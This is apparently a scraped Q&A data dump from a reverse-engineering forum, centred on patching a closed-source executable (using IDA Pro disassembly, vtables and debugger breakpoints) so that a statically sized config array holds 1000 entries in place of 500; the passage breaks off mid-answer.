I did the custom struct by doing a bunch of Arrays (* key), then setting proper sizes. (Guessing this isn't the proper way to make a structure in IDA PRO?)
<img src=""https://i.stack.imgur.com/c5OBF.png"" alt=""struct"">
<br>Before:<br>
<img src=""https://i.stack.imgur.com/u2VGH.png"" alt=""before"">
<br>After:<br>
<img src=""https://i.stack.imgur.com/p96Au.png"" alt=""after"">
<br>ASM:<br>
<img src=""https://i.stack.imgur.com/wQXTP.png"" alt=""asm"">
<br>Edit Function<br>
<img src=""https://i.stack.imgur.com/2rANk.png"" alt=""edit function"">
<br>Double clicked local variable<br>
<img src=""https://i.stack.imgur.com/9vKkW.png"" alt=""dbl click local variables""></p>
","<p>From above...</p>

<p><strong>Decompiled:</strong></p>

<pre><code>*(_DWORD *)(shipsStruct - 4) = playerPointer-&gt;ssXCoord;
*(_DWORD *)shipsStruct = playerPointer-&gt;ssYCoord;
...
</code></pre>

<p><strong>Original:</strong></p>

<pre><code>Ships[i].XCoordinate = *(DWORD *) (playerPtr + 0x4);
Ships[i].YCoordinate = *(DWORD *) (playerPtr + 0x8);
...
</code></pre>

<p>Based on these snippets, it looks like the structure in your stack variables is 8 bytes off. Can you share with us the stack variable list for that function? (Double-click on one of the local variables in the decompilation to open the stack view.)</p>
","3332"
"How to deal with Static Memory Allocation while modifying an executable?","2333","","<p>I'm not new to StackExchange, but I'm quite new to reverse engineering, so please be patient with me! :P</p>

<p>At present I'm dealing with an executable that I would like to modify a little bit, for personal use; the source code of the application is not available so I can only modify it or die trying. I'm using both IDA Pro 6.1 and OllyDBG 2.0 as tools.</p>

<p>To be exact, I would just like to increase the amount of CFG_ENTRY that the application can read from <code>500</code> to <code>1000</code> in the method <code>ReadCfgFile</code> which, apparently, has a static memory region preallocated at compile-time:</p>

<pre><code>.text:008F2860 ReadCfgFile     proc near ; DATA XREF: .rdata:0137A1ECo
.text:008F2860 var_20          = dword ptr -20h
.text:008F2860 var_1C          = dword ptr -1Ch
.text:008F2860 var_18          = dword ptr -18h
.text:008F2860 var_C           = dword ptr -0Ch
.text:008F2860 var_4           = dword ptr -4
.text:008F2860 arg_0           = dword ptr  4
.text:008F2860 arg_4           = byte ptr  8
.text:008F2860
.text:008F2860                 push    0FFFFFFFFh
.text:008F2862                 mov     eax, large fs:0
.text:008F2868                 push    offset sub_1288B18
.text:008F286D                 push    eax
.text:008F286E                 mov     large fs:0, esp
.text:008F2875                 sub     esp, 14h
.text:008F2878                 push    ebx
.text:008F2879                 push    ebp
.text:008F287A                 push    esi
.text:008F287B                 push    edi
.text:008F287C                 mov     edi, [esp+30h+arg_0]
.text:008F2880                 mov     eax, [edi+10h]
.text:008F2883                 cmp     eax, [edi+8]
.text:008F2886                 mov     esi, ecx
.text:008F2888                 jnb     loc_8F2930
.text:008F288E                 mov     edi, edi
.text:008F2890
.text:008F2890 loc_8F2890:
.text:008F2890                 mov     eax, [esi+79954h]
.text:008F2896                 cmp     eax, 3E8h
.text:008F289B                 jge     loc_8F29DF
.text:008F28A1                 mov     edx, eax
.text:008F28A3                 shl     edx, 5
.text:008F28A6                 lea     ecx, [eax+1]
.text:008F28A9                 sub     edx, eax
.text:008F28AB                 lea     eax, [eax+edx*8]
.text:008F28AE                 mov     [esi+79954h], ecx
.text:008F28B4                 push    edi
.text:008F28B5                 lea     ecx, [esi+eax*4+4]
.text:008F28B9                 call    ReadEDURecord
.text:008F28BE                 test    al, al
.text:008F28C0                 jz      loc_8F2947
.text:008F28C6                 mov     eax, [esi+79954h]
.text:008F28CC                 mov     ecx, eax
.text:008F28CE                 shl     ecx, 5
.text:008F28D1                 sub     ecx, eax
.text:008F28D3                 lea     edx, [eax+ecx*8]
.text:008F28D6                 mov     ebp, [esi+edx*4-3E0h]
.text:008F28DD                 lea     eax, [esp+30h+arg_0]
.text:008F28E1                 lea     ebx, [esi+79958h]
.text:008F28E7                 push    eax
.text:008F28E8                 mov     ecx, ebx
.text:008F28EA                 mov     [esp+34h+arg_0], ebp
.text:008F28EE                 call    sub_437DF0
.text:008F28F3                 test    eax, eax
.text:008F28F5                 jz      short loc_8F2902
.text:008F28F7                 cmp     [esp+30h+arg_4], 0
.text:008F28FC                 jz      loc_8F2994
.text:008F2902
.text:008F2902 loc_8F2902:
.text:008F2902                 mov     ecx, [esi+79954h]
.text:008F2908                 sub     ecx, 1
.text:008F290B                 lea     edx, [esp+30h+arg_0]
.text:008F290F                 push    edx
.text:008F2910                 lea     eax, [esp+34h+var_20]
.text:008F2914                 mov     [esp+34h+arg_0], ecx
.text:008F2918                 push    eax
.text:008F2919                 mov     ecx, ebx
.text:008F291B                 mov     [esp+38h+var_20], ebp
.text:008F291F                 call    sub_437890
.text:008F2924                 mov     ecx, [edi+10h]
.text:008F2927                 cmp     ecx, [edi+8]
.text:008F292A                 jb      loc_8F2890
.text:008F2930
.text:008F2930 loc_8F2930:
.text:008F2930                 pop     edi
.text:008F2931                 pop     esi
.text:008F2932                 pop     ebp
.text:008F2933                 mov     al, 1
.text:008F2935                 pop     ebx
.text:008F2936                 mov     ecx, [esp+20h+var_C]
.text:008F293A                 mov     large fs:0, ecx
.text:008F2941                 add     esp, 20h
.text:008F2944                 retn    8
.text:008F2947
.text:008F2947 loc_8F2947:
.text:008F2947                 push    0
.text:008F2949                 call    sub_D386E0
.text:008F294E                 add     esp, 4
.text:008F2951                 mov     ecx, edi
.text:008F2953                 mov     esi, eax
.text:008F2955                 call    sub_D4D270
.text:008F295A                 push    eax ; ArgList
.text:008F295B                 push    offset aErrMsg_1 ; Error Message
.text:008F2960                 call    sub_D386E0
.text:008F2965                 add     esp, 8
.text:008F2968                 call    sub_D388C0
.text:008F296D                 lea     edx, [esp+30h+var_20]
.text:008F2971                 push    edx
.text:008F2972                 lea     ecx, [esp+34h+var_18]
.text:008F2976                 mov     [esp+34h+var_20], eax
.text:008F297A                 mov     [esp+34h+var_1C], 640h
.text:008F2982                 call    sub_403D60
.text:008F2987                 mov     [esp+30h+var_4], 0
.text:008F298F                 jmp     loc_8F2A27
.text:008F2994
.text:008F2994 loc_8F2994:
.text:008F2994                 push    0
.text:008F2996                 call    sub_D386E0
.text:008F299B                 add     esp, 4
.text:008F299E                 mov     ecx, edi
.text:008F29A0                 mov     esi, eax
.text:008F29A2                 call    sub_D4D270
.text:008F29A7                 push    eax
.text:008F29A8                 push    ebp             ; ArgList
.text:008F29A9                 push    offset aErrMsg_2 ; Error Message
.text:008F29AE                 call    sub_D386E0
.text:008F29B3                 add     esp, 0Ch
.text:008F29B6                 call    sub_D388C0
.text:008F29BB                 mov     [esp+30h+var_20], eax
.text:008F29BF                 lea     eax, [esp+30h+var_20]
.text:008F29C3                 push    eax
.text:008F29C4                 lea     ecx, [esp+34h+var_18]
.text:008F29C8                 mov     [esp+34h+var_1C], 640h
.text:008F29D0                 call    sub_403D60
.text:008F29D5                 mov     [esp+30h+var_4], 1
.text:008F29DD                 jmp     short loc_8F2A27
.text:008F29DF
.text:008F29DF loc_8F29DF:
.text:008F29DF                 push    0
.text:008F29E1                 call    sub_D386E0
.text:008F29E6                 add     esp, 4
.text:008F29E9                 mov     ecx, edi
.text:008F29EB                 mov     esi, eax
.text:008F29ED                 call    sub_D4D270
.text:008F29F2                 push    eax             ; ArgList
.text:008F29F3                 push    offset aErrMsg_0 ; Error Message
.text:008F29F8                 call    sub_D386E0
.text:008F29FD                 add     esp, 8
.text:008F2A00                 call    sub_D388C0
.text:008F2A05                 lea     ecx, [esp+30h+var_20]
.text:008F2A09                 push    ecx
.text:008F2A0A                 lea     ecx, [esp+34h+var_18]
.text:008F2A0E                 mov     [esp+34h+var_20], eax
.text:008F2A12                 mov     [esp+34h+var_1C], 640h
.text:008F2A1A                 call    sub_403D60
.text:008F2A1F                 mov     [esp+30h+var_4], 2
.text:008F2A27
.text:008F2A27 loc_8F2A27:
.text:008F2A27                 mov     eax, [esp+30h+var_18]
.text:008F2A2B                 test    eax, eax
.text:008F2A2D                 jz      short loc_8F2A3A
.text:008F2A2F                 push    esi
.text:008F2A30                 push    eax
.text:008F2A31                 call    ds:??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt; &amp;,char const *)
.text:008F2A37                 add     esp, 8
.text:008F2A3A
.text:008F2A3A loc_8F2A3A:
.text:008F2A3A                 lea     ecx, [esp+30h+var_18]
.text:008F2A3E                 mov     [esp+30h+var_4], 0FFFFFFFFh
.text:008F2A46                 call    sub_403DF0
.text:008F2A4B                 mov     ecx, [esp+30h+var_C]
.text:008F2A4F                 pop     edi
.text:008F2A50                 pop     esi
.text:008F2A51                 pop     ebp
.text:008F2A52                 xor     al, al
.text:008F2A54                 pop     ebx
.text:008F2A55                 mov     large fs:0, ecx
.text:008F2A5C                 add     esp, 20h
.text:008F2A5F                 retn    8
.text:008F2A5F ReadCfgFile     endp
</code></pre>

<p><strong>[EDIT 1 - All what I should have known since the beginning!]</strong></p>

<p>After following the suggestions of the answer of @sealed..., I used a class inspector to detect the Virtual Function Table and I found the full class descriptor. Well... in fact there are two classes referring to my target method <code>ReadCfgFile</code> and no direct calls to it in the whole executable:</p>

<pre><code>.rdata:0137A1D4 ; class DATABASE_TABLE&lt;CFG_ENTRY,500,unsigned int&gt; [SI] O: 0, A: 0
.rdata:0137A1D4 dd offset ??_R4?$DATABASE_TABLE@UCFG_ENTRY@@$0BPE@I@@6B@ ; RTTI Complete Object Locator
.rdata:0137A1D8 ; const DATABASE_TABLE&lt;struct CFG_ENTRY,500,unsigned int&gt; VF Table
.rdata:0137A1D8 ??_7?$DATABASE_TABLE@UCFG_ENTRY@@$0BPE@I@@6B@ dd offset sub_8EF0F0 ; DATA XREF: sub_8EEFC0+1Do
.rdata:0137A1DC dd offset nullsub_648
.rdata:0137A1E0 dd offset sub_8EAB30
.rdata:0137A1E4 dd offset sub_8EF060
.rdata:0137A1E8 dd offset sub_8EE500
.rdata:0137A1EC dd offset ReadCfgFile

.rdata:0137A1F0 ; class CFG_DB: DATABASE_TABLE&lt;CFG_ENTRY,500,unsigned int&gt; [SI] O: 0, A: 0
.rdata:0137A1F0 dd offset ??_R4CFG_DB@@6B@ ; RTTI Complete Object Locator
.rdata:0137A1F4 ; const CFG_DB VFTable
.rdata:0137A1F4 ??_7UNIT_DB@@6B@ dd offset sub_8EF2B0 ; DATA XREF: sub_8EF290+8o
.rdata:0137A1F8 dd offset nullsub_648
.rdata:0137A1FC dd offset sub_8EAB30
.rdata:0137A200 dd offset sub_8EF060
.rdata:0137A204 dd offset sub_8EE8B0
.rdata:0137A208 dd offset ReadCfgFile
.rdata:0137A20C dd offset sub_8EE5D0
</code></pre>

<p><strong>[EDIT 2 - The adventure continues! Yay!]</strong></p>

<p>After reading the answer of @Guntram Blohm, I investigated some more in order to collect and analyze the data he suggested. The first thing I did is to analyze the executable with PEiD and here is the information I got from it:</p>

<pre><code>Compiler: Microsoft Visual C++ 7.0 Method2 [Debug]
Entropy: 6.24 (Not Packed)
Linker Info: 7.10
</code></pre>

<p>When I set a breakpoint on my <code>ReadCfgFile</code> method, here is what I get from OllyDBG stack:</p>

<pre><code>CPU Stack
Address   Value      ASCII Comments
0018B2C0  [008EE644  D�.  ; RETURN to myapp.008EE644
</code></pre>

<p>And <code>008EE644</code> is a small part of the following method that, for what I can understand, looks for the configuration file and starts the routine for reading it, but without an explicit call to <code>ReadCfgFile</code> (offset highlighted):</p>

<pre><code>.text:008EE5D0 sub_8EE5D0      proc near ; CODE XREF: sub_411B20+2CBp
.text:008EE5D0 var_41          = byte ptr -41h
.text:008EE5D0 var_40          = dword ptr -40h
.text:008EE5D0 var_3C          = dword ptr -3Ch
.text:008EE5D0 var_38          = byte ptr -38h
.text:008EE5D0 var_34          = dword ptr -34h
.text:008EE5D0 var_30          = dword ptr -30h
.text:008EE5D0 var_2C          = byte ptr -2Ch
.text:008EE5D0 var_C           = dword ptr -0Ch
.text:008EE5D0 var_4           = dword ptr -4
.text:008EE5D0
.text:008EE5D0                 push    0FFFFFFFFh
.text:008EE5D2                 push    offset SEH_8EE5D0
.text:008EE5D7                 mov     eax, large fs:0
.text:008EE5DD                 push    eax
.text:008EE5DE                 mov     large fs:0, esp
.text:008EE5E5                 sub     esp, 38h
.text:008EE5E8                 push    ebx
.text:008EE5E9                 push    ebp
.text:008EE5EA                 mov     ebx, ecx
.text:008EE5EC                 push    offset aCfgFile ; ""application.cfg""
.text:008EE5F1                 mov     [esp+50h+var_30], ebx
.text:008EE5F5                 call    sub_41BD00
.text:008EE5FA                 add     esp, 4
.text:008EE5FD                 push    eax
.text:008EE5FE                 lea     ecx, [esp+50h+var_38]
.text:008EE602                 call    sub_F018E0
.text:008EE607                 xor     ebp, ebp
.text:008EE609                 push    ebp
.text:008EE60A                 lea     eax, [esp+50h+var_38]
.text:008EE60E                 push    eax
.text:008EE60F                 lea     ecx, [esp+54h+var_2C]
.text:008EE613                 mov     [esp+54h+var_4], ebp
.text:008EE617                 call    sub_D50170
.text:008EE61C                 lea     ecx, [esp+4Ch+var_38] ; void *
.text:008EE620                 mov     byte ptr [esp+4Ch+var_4], 2
.text:008EE625                 call    sub_EFFE30
.text:008EE62A                 mov     edx, [ebx]
.text:008EE62C                 mov     ecx, ebx
.text:008EE62E                 mov     [ebx+7A938h], ebp
.text:008EE634                 call    dword ptr [edx+4]
.text:008EE637                 mov     eax, [ebx]
.text:008EE639                 push    ebp
.text:008EE63A                 lea     ecx, [esp+50h+var_2C]
.text:008EE63E                 push    ecx
.text:008EE63F                 mov     ecx, ebx
.text:008EE641                 call    dword ptr [eax+14h]
.text:008EE644 ; ---------------------------------------------------------------------------         
.text:008EE644                 test    al, al ; HERE IS THE STACK REFERENCE
.text:008EE644 ; ---------------------------------------------------------------------------   
.text:008EE646                 jnz     short loc_8EE66C
.text:008EE648                 lea     ecx, [esp+4Ch+var_2C]
.text:008EE64C                 mov     [esp+4Ch+var_4], 0FFFFFFFFh
.text:008EE654                 call    sub_D4BB30
.text:008EE659                 pop     ebp
.text:008EE65A                 xor     al, al
.text:008EE65C                 pop     ebx
.text:008EE65D                 mov     ecx, [esp+44h+var_C]
.text:008EE661                 mov     large fs:0, ecx
.text:008EE668                 add     esp, 44h
.text:008EE66B                 retn
.text:008EE66C
.text:008EE66C loc_8EE66C:
.text:008EE66C                 xor     edx, edx
.text:008EE66E                 or      eax, 0FFFFFFFFh
.text:008EE671                 mov     dword_1986644, edx
.text:008EE677                 mov     dword_1986650, eax
.text:008EE67C                 push    esi
.text:008EE67D                 mov     dword_1986648, edx
.text:008EE683                 mov     dword_1986654, eax
.text:008EE688                 push    edi
.text:008EE689                 mov     dword_198664C, edx
.text:008EE68F                 mov     dword_1986658, eax
.text:008EE694                 xor     edi, edi
.text:008EE696                 cmp     [ebx+79954h], ebp
.text:008EE69C                 jle     loc_8EE727
.text:008EE6A2                 lea     esi, [ebx+40h]
.text:008EE6A5                 jmp     short loc_8EE6B0
.text:008EE6A7                 align 10h
.text:008EE6B0
.text:008EE6B0 loc_8EE6B0:
.text:008EE6B0                 mov     eax, [esi]
.text:008EE6B2                 mov     cx, [esi+92h]
.text:008EE6B9                 lea     eax, ds:1986644h[eax*2]
.text:008EE6C0                 mov     ax, [eax]
.text:008EE6C3                 cmp     ax, cx
.text:008EE6C6                 jnb     short loc_8EE6CA
.text:008EE6C8                 mov     eax, ecx
.text:008EE6CA
.text:008EE6CA loc_8EE6CA:
.text:008EE6CA                 mov     ecx, [esi]
.text:008EE6CC                 mov     word ptr dword_1986644[ecx*2], ax
.text:008EE6D4                 mov     eax, [esi]
.text:008EE6D6                 mov     cx, [esi+92h]
.text:008EE6DD                 lea     eax, ds:1986650h[eax*2]
.text:008EE6E4                 mov     ax, [eax]
.text:008EE6E7                 cmp     ax, cx
.text:008EE6EA                 jb      short loc_8EE6EE
.text:008EE6EC                 mov     eax, ecx
.text:008EE6EE
.text:008EE6EE loc_8EE6EE:
.text:008EE6EE                 mov     edx, [esi]
.text:008EE6F0                 lea     ecx, [esi-3Ch]
.text:008EE6F3                 mov     word ptr dword_1986650[edx*2], ax
.text:008EE6FB                 call    sub_8ED600
.text:008EE700                 push    eax
.text:008EE701                 mov     eax, [ebx+7A938h]
.text:008EE707                 push    eax
.text:008EE708                 call    sub_F1E550
.text:008EE70D                 add     edi, 1
.text:008EE710                 add     esp, 8
.text:008EE713                 mov     [ebx+7A938h], eax
.text:008EE719                 add     esi, 3E4h
.text:008EE71F                 cmp     edi, [ebx+79954h]
.text:008EE725                 jl      short loc_8EE6B0
.text:008EE727
.text:008EE727 loc_8EE727:
.text:008EE727                 xor     esi, esi
.text:008EE729                 cmp     dword_1667290, ebp
.text:008EE72F                 mov     [esp+54h+var_3C], esi
.text:008EE733                 jbe     loc_8EE840
.text:008EE739                 lea     esp, [esp+0]
.text:008EE740
.text:008EE740 loc_8EE740:
.text:008EE740                 cmp     [ebx+79954h], ebp
.text:008EE746                 mov     [esp+54h+var_41], 0
.text:008EE74B                 mov     [esp+54h+var_40], ebp
.text:008EE74F                 mov     [esp+54h+var_34], ebp
.text:008EE753                 jle     loc_8EE7D9
.text:008EE759                 mov     ebp, 1
.text:008EE75E                 mov     ecx, esi
.text:008EE760                 shl     ebp, cl
.text:008EE762                 lea     edi, [ebx+3B0h]
.text:008EE768
.text:008EE768 loc_8EE768:
.text:008EE768                 cmp     [esp+54h+var_41], 0
.text:008EE76D                 jnz     short loc_8EE77F
.text:008EE76F                 test    [edi-2Ch], ebp
.text:008EE772                 jz      short loc_8EE77F
.text:008EE774                 test    byte ptr [edi+3], 20h
.text:008EE778                 jz      short loc_8EE77F
.text:008EE77A                 mov     [esp+54h+var_41], 1
.text:008EE77F
.text:008EE77F loc_8EE77F: 
.text:008EE77F                 xor     esi, esi
.text:008EE781                 xor     eax, eax
.text:008EE783
.text:008EE783 loc_8EE783:
.text:008EE783                 mov     ecx, [edi-24h]
.text:008EE786                 test    [eax+ecx], ebp
.text:008EE789                 jz      short loc_8EE7AF
.text:008EE78B                 cmp     eax, 10h
.text:008EE78E                 jnb     loc_8EE89B
.text:008EE794                 mov     ecx, esi
.text:008EE796                 shr     ecx, 5
.text:008EE799                 lea     edx, [esp+ecx*4+54h+var_40]
.text:008EE79D                 mov     ecx, esi
.text:008EE79F                 and     ecx, 1Fh
.text:008EE7A2                 mov     ebx, 1
.text:008EE7A7                 shl     ebx, cl
.text:008EE7A9                 or      [edx], ebx
.text:008EE7AB                 mov     ebx, [esp+54h+var_30]
.text:008EE7AF
.text:008EE7AF loc_8EE7AF:
.text:008EE7AF                 add     eax, 4
.text:008EE7B2                 add     esi, 1
.text:008EE7B5                 cmp     eax, 10h
.text:008EE7B8                 jb      short loc_8EE783
.text:008EE7BA                 mov     eax, [esp+54h+var_34]
.text:008EE7BE                 add     eax, 1
.text:008EE7C1                 add     edi, 3E4h
.text:008EE7C7                 cmp     eax, [ebx+79954h]
.text:008EE7CD                 mov     [esp+54h+var_34], eax
.text:008EE7D1                 jl      short loc_8EE768
.text:008EE7D3                 mov     esi, [esp+54h+var_3C]
.text:008EE7D7                 xor     ebp, ebp
.text:008EE7D9
.text:008EE7D9 loc_8EE7D9:
.text:008EE7D9                 push    esi
.text:008EE7DA                 call    sub_8D1490
.text:008EE7DF                 mov     edi, eax
.text:008EE7E1                 add     esp, 4
.text:008EE7E4                 cmp     byte ptr [edi+0BCh], 0
.text:008EE7EB                 jz      short loc_8EE82D
.text:008EE7ED                 xor     esi, esi
.text:008EE7EF                 cmp     esi, 4
.text:008EE7F2                 jnb     loc_8EE8A4
.text:008EE7F8
.text:008EE7F8 loc_8EE7F8:
.text:008EE7F8                 mov     ecx, esi
.text:008EE7FA                 and     ecx, 1Fh
.text:008EE7FD                 mov     edx, 1
.text:008EE802                 shl     edx, cl
.text:008EE804                 mov     ecx, esi
.text:008EE806                 shr     ecx, 5
.text:008EE809                 add     ecx, ecx
.text:008EE80B                 add     ecx, ecx
.text:008EE80D                 test    [esp+ecx+54h+var_40], edx
.text:008EE811                 setnz   al
.text:008EE814                 test    al, al
.text:008EE816                 jnz     short loc_8EE821
.text:008EE818                 not     edx
.text:008EE81A                 and     [ecx+edi+0C0h], edx
.text:008EE821
.text:008EE821 loc_8EE821:
.text:008EE821                 add     esi, 1
.text:008EE824                 cmp     esi, 4
.text:008EE827                 jb      short loc_8EE7F8
.text:008EE829                 mov     esi, [esp+54h+var_3C]
.text:008EE82D
.text:008EE82D loc_8EE82D:
.text:008EE82D                 add     esi, 1
.text:008EE830                 cmp     esi, dword_1667290
.text:008EE836                 mov     [esp+54h+var_3C], esi
.text:008EE83A                 jb      loc_8EE740
.text:008EE840
.text:008EE840 loc_8EE840:
.text:008EE840                 xor     esi, esi
.text:008EE842                 cmp     [ebx+79954h], ebp
.text:008EE848                 jle     short loc_8EE875
.text:008EE84A                 lea     edi, [ebx+108h]
.text:008EE850
.text:008EE850 loc_8EE850:
.text:008EE850                 mov     eax, [edi]
.text:008EE852                 mov     ecx, dword_16E9DC8
.text:008EE858                 push    eax ; Str2
.text:008EE859                 add     ecx, 84h
.text:008EE85F                 call    sub_10E86C0
.text:008EE864                 add     esi, 1
.text:008EE867                 add     edi, 3E4h
.text:008EE86D                 cmp     esi, [ebx+79954h]
.text:008EE873                 jl      short loc_8EE850
.text:008EE875
.text:008EE875 loc_8EE875:
.text:008EE875                 lea     ecx, [esp+54h+var_2C]
.text:008EE879                 mov     [esp+54h+var_4], 0FFFFFFFFh
.text:008EE881                 call    sub_D4BB30
.text:008EE886                 mov     ecx, [esp+54h+var_C]
.text:008EE88A                 pop     edi
.text:008EE88B                 pop     esi
.text:008EE88C                 pop     ebp
.text:008EE88D                 mov     al, 1
.text:008EE88F                 pop     ebx
.text:008EE890                 mov     large fs:0, ecx
.text:008EE897                 add     esp, 44h
.text:008EE89A                 retn
.text:008EE89B
.text:008EE89B loc_8EE89B:
.text:008EE89B                 lea     ecx, [esp+54h+var_40]
.text:008EE89F                 jmp     sub_8D0FE0
.text:008EE8A4
.text:008EE8A4 loc_8EE8A4:
.text:008EE8A4                 lea     ecx, [esp+54h+var_40]
.text:008EE8A8                 jmp     sub_8D0FE0
.text:008EE8A8 sub_8EE5D0      endp
</code></pre>

<p>The, I digged a little bit more finding out the <code>CFG_DB</code> contructor, which looks like this (pseudo-code from IDA Pro):</p>

<pre><code>void __thiscall sub_8EEFC0(void *this)
{
  void *v1 = this; // esi@1

  *(_DWORD *)this = &amp;DATABASE_TABLE&lt;CFG_ENTRY_500_unsigned_int&gt;::_vftable_;

  sub_8EE500((int)this);
  sub_8EC030((char *)v1 + 502036);

  if ( *((_DWORD *)v1 + 124503) )
    operator delete__(*((void **)v1 + 124503));

  *((_DWORD *)v1 + 124503) = 0;

  unknown_libname_2673((char *)v1 + 4, 0x3E4u, 500, sub_8EEA00);
}
</code></pre>

<p>So it looks like the ""array"" of <code>CFG_ENTRY</code> is being instantiated calling a method belonging to another library linked to the executable.
Finally, I put a breakpoint at the beginning of my <code>ReadCfgFile</code> method in order to see if pointers passed to it can be of any help:</p>

<pre><code>.text:008F287A                 push esi ==&gt; esi = 00400000
[...]                          [...]
.text:008F2886                 mov esi, ecx ==&gt; ecx = myapp.0190BD08
</code></pre>

<p>And following the address <code>0190BD08</code> I just stumbled upon this:</p>

<pre><code>.data:0190BD08 unk_190BD08     db    ? ; ; DATA XREF: sub_40FFF0:loc_410049o
.data:0190BD08                           ; sub_40FFF0:loc_410053o ...

.text:00410049 loc_410049: ; DATA XREF: .rdata:01484034o
.text:00410049 ; .rdata:0148489Co ...
.text:00410049                 mov     ecx, offset unk_190BD08

.text:00410053
.text:00410053 loc_410053: ; DATA XREF: .rdata:01484078o
.text:00410053 ; .rdata:01484C3Co ...
.text:00410053                 mov     ecx, offset unk_190BD08
</code></pre>

<p>It looks like a dead end to me...</p>
","<p>It seems to me that the problem is a bit worse than you describe, and there's no easy way to get around it.</p>

<p>First, @sealed seems to be right with the function being a class method, and your compiler passing the class pointer in <code>ecx</code>, because that's the only way for</p>

<pre><code>.text:008F28B5                 lea     ecx, [esi+eax*4+4]
.text:008F28B9                 call    ReadCfgEntry
</code></pre>

<p>to make sense - other parameters are pushed on the stack, and the values of eax, edx and ebx seem not to be very meaningful, so the compiler doesn't use some kind of parameters-in-registers fastcall abi.</p>

<p>Now, let me reorder the statements from the loop start to the call a bit (without changing the meaning, just to make a bit clearer what happens). The compiler spread the ""increment the count by one"" instructions between the others, probably to take advantage of pipelining within the processor:</p>

<pre><code>-- get the current ""number of config entries"" count, and abort the loop if it exceeds 500

.text:008F2890                 mov     eax, [esi+79954h]
.text:008F2896                 cmp     eax, 1F4h
.text:008F289B                 jge     loc_8F29DF

-- increment the count by one

.text:008F28A6                 lea     ecx, [eax+1]
.text:008F28AE                 mov     [esi+79954h], ecx

-- eax = (( count &lt;&lt; 5 - count ) * 8 ) + count = count*249
.text:008F28A1                 mov     edx, eax
.text:008F28A3                 shl     edx, 5
.text:008F28A9                 sub     edx, eax
.text:008F28AB                 lea     eax, [eax+edx*8]

-- push edi, which is a parameter to this function, on the stack;
-- pass this = esi+4*eax+4  == esi+996*count+4 in ecx. Remember esi was set to
-- `this`=`ecx` at the start of the current method and hasn't been changed.

.text:008F28B4                 push    edi
.text:008F28B5                 lea     ecx, [esi+eax*4+4]
.text:008F28B9                 call    ReadCfgEntry
</code></pre>

<p>This seems like ReadCfgEntry is a class method as well, which gets its <code>this</code> pointer in cx. From the way the array index is calculated, i'd assume the original C++ class looked like this:</p>

<pre><code>class Configuration {
    int whatever;
    ConfigurationEntry entries[500];
    ....
}
</code></pre>

<p>with ConfigurationEntry being a 996 byte class.
Now, the bad news is: These two class members need 4+(500*996) bytes. This is equal to 498004, or 0x79954. So your entry count is directly behind the entries at 0x79954, with another variable at 0x79958:</p>

<pre><code>class Configuration {
    int whatever;
    ConfigurationEntry entries[500];
    int entryCount;
    int somethingelse;
    ... ??? ...
}
</code></pre>

<p>Now, if the entries had been a pointer and allocated with <code>new</code>, it would have been easier to just modify the size parameter in that new from 500 to 1000. But in your case, you'd have to modify the new method of the Configuration class, and you'd have to modify ALL references to variables ""behind"" the configuration entries as well. You already mentioned that for the count variable at offset 0x79954, and the next variable at offset 0x79958, but there might be more of them that don't get referenced in your reader function, so you'll have a hard time finding them all.</p>

<hr>

<p>I was just about to post this, when i saw your edit to the question.</p>

<p>As you realized in your edit, you need to change all accesses to structure components behind the array of entries that you want to increase. You need to do this in your class methods (which you can find easily as you have the vtables), but also in the rest of your program (as you don't know which of the original class variables where public and might be accessed from outside the class itself). <em>Unfortunately, you can't really automate that, because, for every occurence of, say 0x79954, you'd have to check if it's an index into your class, or something else.</em></p>

<p>Since i don't know which compiler was used to write your program, i can't tell much about how it stores the function vtable. With a bit of luck, the first entry (the one i called <code>whatever</code> earlier) is the vtable pointer. You can check this if you run the program with a debugger, and check if the <code>whatever</code> variable points to the vtable when it reaches the ReadConfigFile method. If it does, this is good, because we don't have to care about overwriting the vtable when extending the structure.</p>

<p>Then, there must be some allocator function for your classes. Since you seem to have a class called DATABASE_TABLE, and a derived one called CFG_DB, the second one is probably larger. Try finding the initializing method of this second, larger class. It should call <code>new</code> or a similar memory-allocator, with a size that fits the structure size (so it's probably somewhere between 79960h and 79a00h), and it should move the vtable pointer into the newly allocated memory, so you might be able to find it checking for cross-references of the vtable. Or, use a debugger and set a breakpoint on ReadConfigFile and check the stack for what called it, chances should be good you find a function that allocates the class instance first, then calls its ReadConfigFile member function.</p>

<p>After you find where the class is instantiated, i'd probably try not to increase the array size from 500 to 1000, but, instead, just allocate a larger array behind the structure. For example, if your current function allocates 79a00h bytes, add the 996000d bytes to it that 1000 entries need, resulting in 16cca0h bytes. Then, change the</p>

<pre><code>lea ecx, [esi+eax*4+4]
</code></pre>

<p>in front of ReadCfgEntry to</p>

<pre><code>lea ecx, [esi+eax*4+16cca0h]
</code></pre>

<p>That way, you've created another array <em>behind</em> the current structure instead of extending the current one. <em>Which means none of your structure offsets, except the config items themselves, have changed</em>.</p>

<p>Speaking in C++, we just changed the class to</p>

<pre><code>class Configuration {
    int whatever;
    ConfigurationEntry entries[500];
    int entryCount;
    int somethingelse;
    ... ??? ...
    ConfigurationEntry newEntries[1000];
}
</code></pre>

<p>and in the next step we have to re-write all accessed to <code>entries</code> to use <code>newentries</code>.</p>

<p>Check your member functions for accesses to the original array, and replace them as well. The most simple way to do this is probably</p>

<ul>
<li>start the program with a debugger</li>
<li>set a breakpoint on the function you identified previously that allocates the structure</li>
<li>after the structure is allocated, set a hardware breakpoint on (structure address + 4)</li>
<li>continue the program, and whenever you hit the hardware breakpoints, you found a match</li>
</ul>

<p>Since the hardware breakpoint is on entries[0], chances are good that every access to an entry hits the 0-th of it at some point.</p>

<p>Also, since ReadCfgEntry is probably a class method, chances are good that there is a loop somewhere that just allocates one class instance for each entry - something like</p>

<pre><code>for (i=0; i&lt;500; i++) {
    entries[i]=new ConfigurationEntry()
}
</code></pre>

<p>Your hardware breakpoint should catch this loop quite quickly. Patch the executable to change the 500 to 1000, and the entries[i] calculation to your new array. After that, your new array will get initialized, but the old one will hold nothing but NULL pointers. Which means, you might get invalid memory acceses through those NULL pointers in the future, which help identifying accessed to your original array (that you can patch) as well.</p>

<hr>

<h2>Edit - Edit after reading OP's 2nd answer</h2>

<p>Dead end? Not at all, you gathered and posted very valuable information.</p>

<p>First, your pseudo code of the CFG_DB constructor</p>

<pre><code>void __thiscall sub_8EEFC0(void *this)
{
  void *v1 = this; // esi@1
